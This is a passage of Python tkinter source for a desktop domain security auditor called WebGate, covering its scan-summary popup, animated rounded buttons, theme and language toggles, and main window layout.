        kv(c1, "OS Guess", os_guess, th["FG2"])

        # ── Col 2: IP / Country ───────────────────────────────
        c2 = col(body)
        tk.Label(c2, text="NETWORK", font=("Courier New", 8, "bold"),
            bg=th["BG2"], fg=th["ACC"]
        ).pack(anchor="w", padx=8, pady=(4, 2))

        ip_list = results.get("resolution", {}).get("ips", [])
        ip = ip_list[0] if ip_list else "N/A"
        rdns = results.get("resolution", {}).get("reverse_dns", "N/A")

        # IP color: green=safe, red=known bad, yellow=unknown
        ip_color = th["ACC3"]
        kv(c2, "IPv4",   ip,   ip_color)
        kv(c2, "rDNS",   rdns[:30] if rdns != "N/A" else "N/A", th["FG2"])

        # Geolocation
        country_info = {"country": "N/A", "city": "N/A", "org": "N/A"}
        try:
            url = f"https://ipinfo.io/{ip}/json"
            with urlopen(Request(url, headers={"User-Agent": "WebGate/3.0"}),
                         timeout=5) as resp:
                data = json.load(resp)
                country_info["country"] = data.get("country", "N/A")
                country_info["city"]    = data.get("city", "N/A")
                country_info["org"]     = data.get("org", "N/A")[:28]
        except: pass

        kv(c2, "Country", country_info["country"], th["FG"])
        kv(c2, "City",    country_info["city"],    th["FG2"])
        kv(c2, "ASN/Org", country_info["org"],     th["FG2"])

        # ── Col 3: Ports + CVE count ──────────────────────────
        c3 = col(body)
        tk.Label(c3, text="OPEN PORTS", font=("Courier New", 8, "bold"),
            bg=th["BG2"], fg=th["ACC"]
        ).pack(anchor="w", padx=8, pady=(4, 2))

        open_ports = results.get("ports", {}).get("open", [])
        total_cves = sum(len(p.get("cves", [])) for p in open_ports)

        if not open_ports:
            kv(c3, "Ports", "None found", th["ACC3"])
        else:
            for po in open_ports[:8]:
                cve_n   = len(po.get("cves", []))
                svc_col = th["ERR"] if cve_n > 0 else th["WARN"]
                kv(c3, f"{po['port']}/tcp",
                   f"{po['service']}  [{cve_n} CVE]" if cve_n else po['service'],
                   svc_col)

        kv(c3, "Total CVE", str(total_cves), th["ERR"] if total_cves > 0 else th["ACC3"])

        # ── Col 4: Risk + SSL ─────────────────────────────────
        c4 = col(body)
        tk.Label(c4, text="RISK LEVEL", font=("Courier New", 8, "bold"),
            bg=th["BG2"], fg=th["ACC"]
        ).pack(anchor="w", padx=8, pady=(4, 2))

        ssl_r = results.get("ssl", {})
        ssl_ok = ssl_r.get("available", False)
        ssl_days = ssl_r.get("days_until_expiry")
        sec_score = results.get("http", {}).get("score", 0)

        # Calculate risk
        risk_pts = 0
        if not ssl_ok:         risk_pts += 3
        if total_cves > 5:     risk_pts += 3
        elif total_cves > 0:   risk_pts += 2
        if sec_score < 3:      risk_pts += 2
        if ssl_days is not None and ssl_days < 30: risk_pts += 1
        if len(open_ports) > 5: risk_pts += 1

        if   risk_pts >= 7: risk_lbl, risk_col = "CRITICAL", th["ERR"]
        elif risk_pts >= 4: risk_lbl, risk_col = "HIGH",     th["WARN"]
        elif risk_pts >= 2: risk_lbl, risk_col = "MEDIUM",   "#ffaa00"
        else:               risk_lbl, risk_col = "LOW",      th["ACC3"]

        tk.Label(c4, text=f"  {risk_lbl}",
            font=("Courier New", 16, "bold"),
            bg=th["BG2"], fg=risk_col
        ).pack(anchor="w", padx=8, pady=(2, 6))

        kv(c4, "SSL",  "✓ Valid" if ssl_ok else "✗ None",
           th["ACC3"] if ssl_ok else th["ERR"])
        if ssl_days is not None:
            kv(c4, "SSL Days", str(ssl_days),
               th["ERR"] if ssl_days < 15 else th["FG"])
        kv(c4, "Sec Headers", f"{sec_score}/7",
           th["ERR"] if sec_score < 3 else th["FG"])

        # ── Bottom buttons ────────────────────────────────────
        btn_f = tk.Frame(win, bg=th["BG3"])
        btn_f.pack(fill="x")
        if on_deep:
            tk.Button(btn_f, text=t("summary_next"),
                font=("Courier New", 9, "bold"),
                bg=th["ACC"], fg=th["BG"],
                relief="flat", bd=0, padx=18, pady=6, cursor="hand2",
                command=lambda: (self._slide_out(sh), on_deep())
            ).pack(side="right", padx=10, pady=6)
        tk.Button(btn_f, text=t("summary_close"),
            font=("Courier New", 9),
            bg=th["BG4"], fg=th["FG2"],
            relief="flat", bd=0, padx=14, pady=6, cursor="hand2",
            command=lambda: self._slide_out(sh)
        ).pack(side="right", padx=(0, 4), pady=6)

        # ── Slide-in animation ────────────────────────────────
        self._W = W; self._H = H; self._x = x
        self._target_y = target_y
        self._slide_in(sh, target_y)

    def _slide_in(self, y, target):
        step = max(20, (y - target) // 4)
        ny   = y - step
        try:
            self.win.geometry(f"{self._W}x{self._H}+{self._x}+{int(ny)}")
            self.win.attributes("-alpha", min(0.97, (target - ny + self._H) / self._H))
        except: pass
        if ny > target:
            self.win.after(12, lambda: self._slide_in(ny, target))
        else:
            try:
                self.win.geometry(f"{self._W}x{self._H}+{self._x}+{target}")
                self.win.attributes("-alpha", 0.97)
            except: pass

    def _slide_out(self, sh):
        try:
            geo = self.win.geometry()
            y   = int(geo.split("+")[2])
        except:
            y = self._target_y
        step = max(25, (sh - y) // 3)
        ny   = y + step
        try:
            self.win.geometry(f"{self._W}x{self._H}+{self._x}+{int(ny)}")
            self.win.attributes("-alpha", max(0.0, 1.0 - (ny - self._target_y) / self._H))
        except: pass
        if ny < sh:
            self.win.after(12, lambda: self._slide_out(sh))
        else:
            try: self.win.destroy()
            except: pass


# ═══════════════════════════════════════════════════════════════
# COLOR HELPERS + ROUNDED BUTTON
# ═══════════════════════════════════════════════════════════════
def _hex_to_rgb(h):
    h = h.lstrip("#")
    if len(h) == 3: h = h[0]*2+h[1]*2+h[2]*2
    return int(h[0:2],16), int(h[2:4],16), int(h[4:6],16)

def _rgb_to_hex(r,g,b):
    return f"#{max(0,min(255,r)):02x}{max(0,min(255,g)):02x}{max(0,min(255,b)):02x}"

def _lerp_color(c1, c2, t):
    r1,g1,b1 = _hex_to_rgb(c1); r2,g2,b2 = _hex_to_rgb(c2)
    return _rgb_to_hex(int(r1+(r2-r1)*t), int(g1+(g2-g1)*t), int(b1+(b2-b1)*t))

def _lighten(c, amt=0.25):
    r,g,b = _hex_to_rgb(c)
    return _rgb_to_hex(r+int((255-r)*amt), g+int((255-g)*amt), b+int((255-b)*amt))

def _darken(c, amt=0.25):
    r,g,b = _hex_to_rgb(c)
    return _rgb_to_hex(int(r*(1-amt)), int(g*(1-amt)), int(b*(1-amt)))


class RoundedButton(object):
    """Fake 'rounded button' using a Canvas widget.

    drop-in replacement for tk.Button with:
      - smooth polygon rounded corners
      - animated hover (color lerp)
      - press feedback
      - configurable icon prefix
    """
    def __init__(self, parent, text="", icon="", command=None,
                 bg="#1a6fd4", fg="#ffffff", hover_bg=None, press_bg=None,
                 dis_bg="#1a1f32", dis_fg="#3a4868",
                 radius=11, width=0, height=36,
                 font_spec=None, padx=0, pady=0, disabled=False,
                 parent_bg=None, **kw):
        import tkinter as tk
        self._tk       = tk
        self._bg       = bg
        self._fg       = fg
        self._hbg      = hover_bg  or _lighten(bg, 0.22)
        self._pbg      = press_bg  or _lighten(bg, 0.40)
        self._dis_bg   = dis_bg
        self._dis_fg   = dis_fg
        self._radius   = radius
        self._icon     = icon
        self._label    = text
        self._text     = (icon + "  " + text).strip() if icon else text
        self._cmd      = command
        self._disabled = disabled
        self._font     = font_spec or ("DejaVu Sans", 10, "bold")
        self._cur      = dis_bg if disabled else bg
        self._anim_id  = None
        self._hover    = False

        pbg = parent_bg
        if pbg is None:
            try:    pbg = parent.cget("bg")
            except: pbg = "#0a0d14"

        if not width:
            # Cyrillic chars ~1.4x wider than ASCII in most fonts
            char_w = sum(14 if ord(c) > 127 else 8 for c in self._text)
            width = max(90, char_w + 42)

        self.widget = tk.Canvas(parent, width=width, height=height,
                                highlightthickness=0, bd=0, bg=pbg,
                                cursor="hand2" if not disabled else "arrow",
                                **kw)
        self.widget.bind("<Configure>", lambda _: self._draw(self._cur))
        if not disabled:
            self.widget.bind("<Enter>",           self._on_enter)
            self.widget.bind("<Leave>",           self._on_leave)
            self.widget.bind("<ButtonPress-1>",   self._on_press)
            self.widget.bind("<ButtonRelease-1>", self._on_release)
        self._draw(self._cur)

    # ── layout proxies (so callers can use .pack / .grid / .place) ──
    def pack(self, **kw):   self.widget.pack(**kw)
    def grid(self, **kw):   self.widget.grid(**kw)
    def place(self, **kw):  self.widget.place(**kw)
    def bind(self, *a, **k):self.widget.bind(*a, **k)
    def pack_forget(self):  self.widget.pack_forget()
    def grid_forget(self):  self.widget.grid_forget()
    def cget(self, k):      return self.widget.cget(k)
    def configure(self, **kw):
        # Handle state=disabled/normal
        if "state" in kw:
            self.set_disabled(kw["state"] == "disabled")
        if "text" in kw:
            self.set_text(kw["text"])

    def _rrect(self, color):
        """Draw rounded-rect polygon."""
        cv = self.widget
        cv.delete("all")
        w = cv.winfo_width() or int(cv.cget("width"))
        h = cv.winfo_height() or int(cv.cget("height"))
        r = min(self._radius, w//2-1, h//2-1)
        pts = [r,0, w-r,0, w,r, w,h-r, w-r,h, r,h, 0,h-r, 0,r]
        cv.create_polygon(pts, smooth=True, fill=color, outline="")
        fg = self._dis_fg if self._disabled else self._fg
        cv.create_text(w//2, h//2, text=self._text, fill=fg,
                       font=self._font, anchor="center")

    def _draw(self, color):
        self._cur = color
        self._rrect(color)

    def _animate(self, start, end, steps=7, step=0):
        if self._anim_id:
            try: self.widget.after_cancel(self._anim_id)
            except: pass
        def _tick(i):
            if i > steps:
                self._draw(end); return
            c = _lerp_color(start, end, i/steps)
            self._draw(c)
            self._anim_id = self.widget.after(14, lambda: _tick(i+1))
        _tick(1)

    def _on_enter(self, _):
        self._hover = True
        self._animate(self._cur, self._hbg)

    def _on_leave(self, _):
        self._hover = False
        self._animate(self._cur, self._bg)

    def _on_press(self, _):
        self._draw(self._pbg)
        play_click()
        # Shrink effect: briefly reduce size by 2px inset
        cv = self.widget
        try:
            w = cv.winfo_width() or int(cv.cget("width"))
            h = cv.winfo_height() or int(cv.cget("height"))
            r = min(self._radius, w//2-1, h//2-1)
            ins = 2
            pts = [r+ins,ins, w-r-ins,ins, w-ins,r+ins, w-ins,h-r-ins,
                   w-r-ins,h-ins, r+ins,h-ins, ins,h-r-ins, ins,r+ins]
            cv.create_polygon(pts, smooth=True, fill=self._pbg, outline="", tags="press_overlay")
            fg = self._dis_fg if self._disabled else self._fg
            cv.create_text(w//2, h//2+1, text=self._text, fill=fg,
                           font=self._font, anchor="center", tags="press_overlay")
        except Exception:
            pass

    def _on_release(self, _):
        try: self.widget.delete("press_overlay")
        except: pass
        self._draw(self._hbg if self._hover else self._bg)
        if self._cmd and not self._disabled:
            self._cmd()

    def set_text(self, text, icon=None):
        if icon is not None: self._icon = icon
        self._label = text
        self._text  = (self._icon+"  "+text).strip() if self._icon else text
        self._draw(self._cur)

    def set_disabled(self, disabled):
        self._disabled = disabled
        if disabled:
            self.widget.config(cursor="arrow")
            self._draw(self._dis_bg)
        else:
            self.widget.config(cursor="hand2")
            self._draw(self._bg)


# ═══════════════════════════════════════════════════════════════
# GUI — MAIN APPLICATION
# ═══════════════════════════════════════════════════════════════
class SecurityScannerGUI:
    def __init__(self, root, prefill: str = ""):
        import tkinter as tk
        from tkinter import font as tkfont
        self.tk   = tk
        self.root = root
        self.th   = get_theme()

        self.root.title("WebGate  —  Domain Security Auditor")
        self.root.minsize(1200, 750)
        self.root.geometry("1440x900")
        self.root.configure(bg=self.th["BG"])

        self._prefill    = prefill
        self.scanning    = False
        self.scanner     = None
        self._log_q      = []
        self._log_busy   = False
        self._scan_start = 0.0
        self._step_idx   = [0]
        self._dot_state  = 0
        self._prog_val   = 0
        self._eta_secs   = 0
        self._surface_done = False

        self.font, self.tfont = self._pick_font()
        self._build_ui()
        self._pulse_dot()

    def _pick_font(self):
        avail = list(self.tk.font.families())
        mono  = next((f for f in ["JetBrains Mono","Fira Code","Cascadia Code",
                                    "Source Code Pro","Consolas","Courier New"] if f in avail),
                      "Courier New")
        title = next((f for f in ["Helvetica Neue","Inter","Segoe UI","DejaVu Sans",
                                    "Helvetica","Arial"] if f in avail), "Helvetica")
        return mono, title

    # ── Transparency ──────────────────────────────────────────
    def _set_alpha(self, val):
        _safe_alpha(self.root, max(0.1, min(1.0, val)))

    def _fade_in_root(self, a=0.0):
        target = SETTINGS.get("transparency", 0.95)
        if a == 0.0:
            # Set invisible BEFORE showing window so no flash
            _safe_alpha(self.root, 0.0)
            self.root.deiconify()
            self.root.update_idletasks()
        nxt = min(target, a + 0.07)
        _safe_alpha(self.root, nxt)
        if nxt < target:
            self.root.after(14, lambda: self._fade_in_root(nxt))

    # ── UI Construction ───────────────────────────────────────
    def _build_ui(self):
        tk = self.tk; th = self.th; root = self.root
        root.configure(bg=th["BG"])

        # ── TOP BAR ────────────────────────────────────────────
        top = tk.Frame(root, bg=th["BG"])
        top.pack(fill="x")

        # Logo — animated canvas with glitch effect
        logo_cv = tk.Canvas(top, bg=th["BG"], height=58,
                             highlightthickness=0, width=360)
        logo_cv.pack(side="left", padx=24, pady=8)
        self._logo_cv = logo_cv
        self._logo_glitch = 0

        def _draw_logo(glitch=False):
            logo_cv.delete("all")
            # Glow/shadow layers
            for dx, dy, col in [(5,34,th["BG4"]),(3,31,th["LOGO_SHD"]),(1,30,th["LOGO_SHD"])]:
                logo_cv.create_text(dx, dy, text="WebGate",
                    font=("Georgia", 40, "bold italic"), fill=col, anchor="w")
            # Glitch effect — offset colored copy
            if glitch:
                logo_cv.create_text(2, 28, text="WebGate",
                    font=("Georgia", 40, "bold italic"),
                    fill=th.get("ACC2", "#ff6b6b"), anchor="w")
                logo_cv.create_text(-1, 28, text="WebGate",
                    font=("Georgia", 40, "bold italic"),
                    fill=th.get("ACC3", "#55efc4"), anchor="w")
            # Main logo text
            logo_cv.create_text(0, 28, text="WebGate",
                font=("Georgia", 40, "bold italic"),
                fill=th["LOGO_CLR"], anchor="w")
            # FW3.7 badge
            logo_cv.create_text(0, 50, text="FW3.7",
                font=("Courier New", 9), fill=th["FG3"], anchor="w")

        _draw_logo()
        self._draw_logo = _draw_logo

        def _glitch_tick():
            if not hasattr(self, "_logo_cv"): return
            self._logo_glitch += 1
            # Random glitch every ~3s
            if self._logo_glitch % 40 == 0:
                _draw_logo(glitch=True)
                self.root.after(80, lambda: _draw_logo(glitch=False))
            self.root.after(75, _glitch_tick)
        self.root.after(2000, _glitch_tick)

        # Right controls
        rc = tk.Frame(top, bg=th["BG"])
        rc.pack(side="right", padx=16, pady=12)

        # Status dot (pulsing indicator)
        self._dot = tk.Label(rc, text="●", font=(self.font, 16),
                              bg=th["BG"], fg=th["FG3"])
        self._dot.pack(side="right", padx=(0, 10))

        # Settings button
        self._settings_rbtn = RoundedButton(rc,
            text="SETTINGS", icon="⚙",
            bg=th["BG4"], fg=th["FG2"], hover_bg=th["BORDER2"],
            font_spec=(self.font, 9), height=32, radius=8,
            command=self._open_settings, parent_bg=th["BG"])
        self._settings_rbtn.pack(side="right", padx=4)
        self._settings_btn = self._settings_rbtn.widget  # compat

        # Language toggle
        self._lang_rbtn = RoundedButton(rc,
            text=SETTINGS["lang"],
            bg=th["BG3"], fg=th["FG"], hover_bg=th["BORDER3"],
            font_spec=(self.font, 9, "bold"), height=32, width=58, radius=8,
            command=self._toggle_lang, parent_bg=th["BG"])
        self._lang_rbtn.pack(side="right", padx=4)

        # Theme toggle
        theme_names = {"dark":"DARK","mono":"MONO","light":"LITE","midnight":"NIGHT","hacker":"HACK","custom":"CUST"}
        self._theme_rbtn = RoundedButton(rc,
            text=theme_names.get(SETTINGS["theme"], "DARK"),
            bg=th["BG3"], fg=th["FG"], hover_bg=th["BORDER3"],
            font_spec=(self.font, 8, "bold"), height=32, width=72, radius=8,
            command=self._cycle_theme, parent_bg=th["BG"])
        self._theme_rbtn.pack(side="right", padx=4)

        # (instructions label removed, separator line removed)

        # ── INPUT ROW ──────────────────────────────────────────
        inrow = tk.Frame(root, bg=th["BG2"])
        inrow.pack(fill="x")
        inner = tk.Frame(inrow, bg=th["BG2"])
        inner.pack(side="left", padx=20, pady=12)

        tk.Label(inner, text=t("target_lbl"),
            font=(self.font, 8, "bold"),
            bg=th["BG2"], fg=th["FG3"]
        ).pack(side="left", padx=(0, 10))

        # Animated entry field with glow border
        self._ef = tk.Frame(inner, bg=th["BORDER2"], padx=2, pady=2)
        self._ef.pack(side="left")
        self._dvar  = tk.StringVar(value=self._prefill)
        self._entry = tk.Entry(self._ef, textvariable=self._dvar,
            font=(self.font, 13),
            bg=th["BG3"], fg=th["FG"],
            insertbackground=th["WHITE"],
            relief="flat", bd=6, width=32)
        self._entry.pack()
        self._entry.bind("<FocusIn>",  self._ef_in)
        self._entry.bind("<FocusOut>", self._ef_out)
        self._entry.bind("<Key>",      lambda e: self._entry_pulse())

        # Animated placeholder
        if not self._prefill:
            self._entry.insert(0, t("placeholder"))
            self._entry.config(fg=th["FG3"])
        self._entry.bind("<FocusIn>",  self._ef_in,  add="+")
        self._entry.bind("<FocusOut>", self._ef_out, add="+")

        # Determine minimum button widths based on language
        _is_ru = SETTINGS.get("lang", "EN") == "RU"
        _scan_w  = 180 if _is_ru else 160
        _deep_w  = 190 if _is_ru else 160
        _cancel_w = 160 if _is_ru else 130

        # Main SCAN button
        self._scan_rbtn = RoundedButton(inner,
            text=t("scan_btn"), icon="▶",
            bg=th["BTN_BG"], fg=th["BTN_FG"],
            hover_bg=th["BTN_HOV"], press_bg=th["BTN_BG"],
            font_spec=(self.font, 11, "bold"),
            height=42, width=_scan_w, radius=12, command=self._on_scan,
            parent_bg=th["BG2"])
        self._scan_rbtn.pack(side="left", padx=(14, 0))
        self._btn = self._scan_rbtn  # compat alias

        # DEEP SCAN button
        self._deep_rbtn = RoundedButton(inner,
            text=t("deep_btn"), icon="⚡",
            bg=th["BG4"], fg=th["FG"],
            hover_bg=th["BORDER2"],
            font_spec=(self.font, 10), height=42, width=_deep_w, radius=12,
            command=self._on_deep_scan, parent_bg=th["BG2"])
        self._deep_rbtn.pack(side="left", padx=(8, 0))
        self._deep_btn = self._deep_rbtn  # compat alias

        # CANCEL button (hidden initially)
        self._cancel_rbtn = RoundedButton(inner,
            text=t("cancel_btn"), icon="✕",
            bg="#3a1a1a", fg=th["ERR"],
            hover_bg="#5a2a2a",
            font_spec=(self.font, 10), height=42, width=_cancel_w, radius=12,
            command=self._on_cancel, parent_bg=th["BG2"])
        self._cancel_btn = self._cancel_rbtn  # compat alias

        # Right side: clear only (copy removed — caused lag)
        right_btns = tk.Frame(inrow, bg=th["BG2"])
        right_btns.pack(side="right", padx=16)
        RoundedButton(right_btns, text="CLEAR", icon="✕",
            bg=th["BG4"], fg=th["FG3"], hover_bg=th["BORDER2"],
            font_spec=(self.font, 8), height=30, radius=8,
            command=self._clear_log, parent_bg=th["BG2"]
        ).pack(side="left", padx=3)

        tk.Frame(root, bg=th["BORDER"], height=1).pack(fill="x")

        # ── MAIN CONTENT ───────────────────────────────────────
        content = tk.Frame(root, bg=th["BG"])
        content.pack(fill="both", expand=True)
        content.columnconfigure(0, weight=1)
        content.rowconfigure(0, weight=1)

        # Log panel
        log_frame = tk.Frame(content, bg=th["BG"])
        log_frame.grid(row=0, column=0, sticky="nsew")
        log_frame.rowconfigure(1, weight=1)
        log_frame.columnconfigure(0, weight=1)

        log_hdr = tk.Frame(log_frame, bg=th["BG3"], height=26)
        log_hdr.grid(row=0, column=0, columnspan=2, sticky="ew")
        tk.Label(log_hdr, text=t("log_hdr"),
            font=(self.font, 8, "bold"),
            bg=th["BG3"], fg=th["FG3"]
        ).pack(side="left", padx=14, pady=4)
        self._evt_lbl = tk.Label(log_hdr, text="",
            font=(self.font, 7), bg=th["BG3"], fg=th["FG3"])
        self._evt_lbl.pack(side="right", padx=14, pady=4)

        self._log_w = tk.Text(log_frame,
            font=(self.font, 10), bg=th["BG"], fg=th["FG"],
            insertbackground=th["WHITE"], relief="flat", bd=0,
            padx=16, pady=12, wrap="word", state="disabled",
            cursor="arrow",
            selectbackground=th["BORDER2"], selectforeground=th["WHITE"])
        sb = tk.Scrollbar(log_frame, orient="vertical",
            command=self._log_w.yview,
            bg=th["BG3"], troughcolor=th["BG"],
            activebackground=th["BORDER2"],
            width=7, relief="flat", bd=0)
        self._log_w.configure(yscrollcommand=sb.set)
        sb.grid(row=1, column=1, sticky="ns")
        self._log_w.grid(row=1, column=0, sticky="nsew")

        for lvl, col_val in th["LOG_CLR"].items():
            self._log_w.tag_configure(f"lvl_{lvl}", foreground=col_val)
        self._log_w.tag_configure("ts",     foreground=th["FG3"])
        self._log_w.tag_configure("pfx_h",  foreground=th["WHITE"],
                                             font=(self.font, 10, "bold"))
        self._log_w.tag_configure("rule",   foreground=th["FG3"])
        self._log_w.tag_configure("cursor", foreground=th["WHITE"])

        # ── RIGHT PANEL ────────────────────────────────────────
        rp = tk.Frame(content, bg=th["BG2"], width=220)
        rp.grid(row=0, column=2, sticky="ns")
        rp.pack_propagate(False)

        def phdr(parent, text):
            f = tk.Frame(parent, bg=th["BG3"], height=26)
            f.pack(fill="x")
            tk.Label(f, text=text, font=(self.font, 7, "bold"),
                bg=th["BG3"], fg=th["FG3"]
            ).pack(side="left", padx=12, pady=4)

        phdr(rp, t("status_hdr"))

        sf = tk.Frame(rp, bg=th["BG2"])
        sf.pack(fill="x", padx=10, pady=6)
        self._stats = {}
        stat_keys = [
            (t("stat_status"),  "IDLE"),
            (t("stat_target"),  "—"),
            (t("stat_ip"),      "—"),
            (t("stat_country"), "—"),
            (t("stat_ports"),   "—"),
            (t("stat_ssl"),     "—"),
            (t("stat_sec"),     "—"),
            (t("stat_time"),    "—"),
            (t("stat_eta"),     "—"),
        ]
        for k, v in stat_keys:
            r = tk.Frame(sf, bg=th["BG2"]); r.pack(fill="x", pady=1)
            tk.Label(r, text=f"{k:<8}", font=(self.font, 7),
                bg=th["BG2"], fg=th["FG3"], anchor="w"
            ).pack(side="left")
            vl = tk.Label(r, text=v, font=(self.font, 8, "bold"),
                bg=th["BG2"], fg=th["FG2"], anchor="w")
            vl.pack(side="left")
            self._stats[k] = vl

        tk.Frame(rp, bg=th["BORDER"], height=1).pack(fill="x", pady=(4, 0))
        phdr(rp, t("steps_hdr"))
        stepf = tk.Frame(rp, bg=th["BG2"])
        stepf.pack(fill="x", padx=10, pady=6)
        self._step_w = []
        for name in t("steps"):
            r = tk.Frame(stepf, bg=th["BG2"]); r.pack(fill="x", pady=1)
            dot = tk.Label(r, text="○", font=(self.font, 10),
                bg=th["BG2"], fg=th["FG3"])
            dot.pack(side="left", padx=(0, 5))
            lbl = tk.Label(r, text=name, font=(self.font, 8),
                bg=th["BG2"], fg=th["FG3"], anchor="w")
            lbl.pack(side="left")
            self._step_w.append((dot, lbl))

        # ── BOTTOM BAR ─────────────────────────────────────────
        tk.Frame(root, bg=th["ACC"], height=2).pack(fill="x", side="bottom")
        bot = tk.Frame(root, bg=th["BG3"], height=36)
        bot.pack(fill="x", side="bottom")
        bot.pack_propagate(False)

        self._prog_lbl = tk.Label(bot, text=t("ready"),
            font=(self.font, 8, "bold"), bg=th["BG3"], fg=th["FG2"])
        self._prog_lbl.pack(side="left", padx=16, pady=8)

        self._cv = tk.Canvas(bot, height=6, bg=th["BG"],
            highlightthickness=0, bd=0)
        self._cv.pack(side="left", fill="x", expand=True, padx=12, pady=15)

        self._eta_lbl = tk.Label(bot, text="",
            font=(self.font, 8), bg=th["BG3"], fg=th["FG3"])
        self._eta_lbl.pack(side="right", padx=8)

        def _link_btn(parent, label, url, icon=""):
            full = (icon + "  " + label).strip() if icon else label
            lbl = tk.Label(parent, text=full,
                font=(self.font, 8, "bold"), bg=th["BG3"],
                fg=th["FG3"], cursor="hand2", padx=6)
            lbl.pack(side="right", padx=4, pady=8)
            def _enter(_):
                lbl.config(fg=th["ACC"])
                self.root.after(0, lambda: lbl.config(
                    font=(self.font, 8, "bold underline")))
            def _leave(_):
                lbl.config(fg=th["FG3"],
                    font=(self.font, 8, "bold"))
            lbl.bind("<Enter>", _enter)
            lbl.bind("<Leave>", _leave)
            lbl.bind("<Button-1>", lambda _: self._open_url(url))
            return lbl

        _link_btn(bot, "@c3less",                 "https://t.me/c3less",                   icon="✈")
        tk.Label(bot, text="·", font=(self.font,8), bg=th["BG3"], fg=th["FG3"]).pack(side="right")
        _link_btn(bot, "github.com/c3less/webgate","https://github.com/c3less/webgate",     icon="⌥")

        self._cv.bind("<Configure>", lambda _: self._draw_prog(self._prog_val))

        # Key bindings
        self.root.bind("<Return>", lambda _: self._on_scan())
        self.root.bind("<Escape>", lambda _: self._on_cancel())
        # Ctrl+scroll = zoom font
        self._font_size = 10
        self.root.bind("<Control-MouseWheel>",
            lambda e: self._zoom_font(1 if e.delta > 0 else -1))
        self.root.bind("<Control-Button-4>",  # Linux scroll up
            lambda _: self._zoom_font(1))
        self.root.bind("<Control-Button-5>",  # Linux scroll down
            lambda _: self._zoom_font(-1))

        self.root.update_idletasks()
        self._draw_prog(0)
        self._push(t("init_msg"), "INFO")

    # ── Hover effects (no-op now — RoundedButton handles its own) ─
    def _btn_hover(self): pass

    # ── Entry animations ──────────────────────────────────────
    def _ef_in(self, _):
        th = self.th
        cur = self._entry.get()
        if cur == t("placeholder"):
            self._entry.delete(0, "end")
            self._entry.config(fg=th["FG"])
        self._entry_glow(0, True)

    def _ef_out(self, _):
        th = self.th
        if not self._entry.get():
            self._entry.insert(0, t("placeholder"))
            self._entry.config(fg=th["FG3"])
        self._entry_glow(0, False)

    def _entry_glow(self, step, focus_in):
        try: frame = self._ef
        except AttributeError: return
        th = self.th
        if focus_in:
            colors = [th["BORDER3"], th["ACC"], th["BORDER3"], th["BORDER2"]]
        else:
            colors = [th["BORDER3"], th["BORDER2"]]
        if step < len(colors):
            try: frame.config(bg=colors[step])
            except: return
            self.root.after(50, lambda: self._entry_glow(step + 1, focus_in))

    def _entry_pulse(self):
        """Brief flash on keypress."""
        th = self.th
        try:
            self._ef.config(bg=th["ACC"])
            self.root.after(80, lambda: self._ef.config(bg=th["BORDER2"]))
        except: pass

    # ── Particle burst (scan start animation) ─────────────────
    def _particle_burst(self):
        """Spawn colored dots that fly out from logo area."""
        try:
            cv = self._cv  # reuse progress canvas area
            th = self.th
            colors = [th["ACC"], th["ACC2"], th["ACC3"], th["WARN"], th["WHITE"]]
            import random as _r
            particles = []
            W = cv.winfo_width() or 400
            for _ in range(18):
                x = _r.randint(10, W - 10)
                y = 3
                dx = _r.uniform(-3, 3)
                dy = _r.uniform(0.5, 3)
                col = _r.choice(colors)
                pid = cv.create_oval(x, y, x+4, y+4, fill=col, outline="")
                particles.append([pid, x, y, dx, dy, col, 1.0])

            def _move(frame=0):
                if frame > 30:
                    for p in particles:
                        try: cv.delete(p[0])
                        except: pass
                    return
                for p in particles:
                    p[1] += p[3]; p[2] += p[4]; p[4] += 0.15  # gravity
                    alpha = 1.0 - frame / 30
                    try:
                        cv.coords(p[0], p[1], p[2], p[1]+4, p[2]+4)
                    except: pass
                self.root.after(25, lambda: _move(frame + 1))
            _move()
        except Exception:
            pass

    # ── Scan-line sweep (active during scanning) ───────────────
    def _scanline_tick(self, x=0):
        """Vertical scanline sweeps across log panel while scanning."""
        if not self.scanning: return
        try:
            th = self.th
            W = self._log_w.winfo_width()
            H = self._log_w.winfo_height()
            # We can't draw on Text widget directly, so animate the border instead
            cycle = x % 8
            colors = [th["BG"], th["BG"], th["BORDER"], th["BORDER2"],
                      th["BORDER3"], th["BORDER2"], th["BORDER"], th["BG"]]
            # Pulse the log area border via text widget relief
        except Exception:
            pass
        self.root.after(60, lambda: self._scanline_tick(x + 1))

    # ── Pulsing dot ───────────────────────────────────────────
    def _pulse_dot(self):
        if not hasattr(self, "_dot"): return
        th = self.th
        if self.scanning:
            cols = [th["FG3"], th["FG2"], th["ACC"], th["WHITE"],
                    th["ACC"], th["FG2"], th["FG3"]]
            try:
                self._dot.config(fg=cols[self._dot_state % len(cols)])
            except: pass
        else:
            try: self._dot.config(fg=th["FG3"])
            except: pass
        self._dot_state += 1
        self.root.after(280, self._pulse_dot)

    # ── Press effect ──────────────────────────────────────────
    def _press_effect(self, btn):
        th  = self.th
        orig = btn.cget("bg")
        def on_press(_):  btn.config(bg=th.get("BORDER2", "#444"))
        def on_release(_): btn.config(bg=orig)
        btn.bind("<ButtonPress-1>",   on_press,   add="+")
        btn.bind("<ButtonRelease-1>", on_release, add="+")

    # ── Language / Theme ──────────────────────────────────────
    def _toggle_lang(self):
        if self.scanning: return
        SETTINGS["lang"] = "RU" if SETTINGS["lang"] == "EN" else "EN"
        save_settings(SETTINGS)
        play_click()
        self._apply_theme(animated=True)

    def _cycle_theme(self):
        if self.scanning: return
        order = [n for n in THEME_ORDER if n != "custom"]
        cur   = SETTINGS.get("theme", "dark")
        idx   = order.index(cur) if cur in order else 0
        nxt   = order[(idx + 1) % len(order)]
        SETTINGS["theme"] = nxt
        save_settings(SETTINGS)
        play_click()
        self._apply_theme(animated=True)

    def _apply_theme(self, animated=False):
        if animated:
            self._fade_out_in()
        else:
            self._rebuild_ui()

    def _fade_out_in(self):
        cur = SETTINGS.get("transparency", 0.93)

        def fade_out(a):
            nv = max(0.0, a - 0.12)
            self._set_alpha(nv)
            if nv > 0.0:
                self.root.after(12, lambda: fade_out(nv))
            else:
                self._rebuild_ui()
                fade_in(0.0)

        def fade_in(a):
            target = SETTINGS.get("transparency", 0.93)
            nv = min(target, a + 0.10)
            self._set_alpha(nv)
            if nv < target:
                self.root.after(12, lambda: fade_in(nv))

        fade_out(cur)

    def _rebuild_ui(self):
        try:    log_content = self._log_w.get("1.0", "end-1c")
        except: log_content = ""
        self.th = get_theme()
        for w in self.root.winfo_children():
            w.destroy()
        self._log_q     = []
        self._log_busy  = False
        self._step_w    = []
        self._stats     = {}
        self._shimmer_x = 0
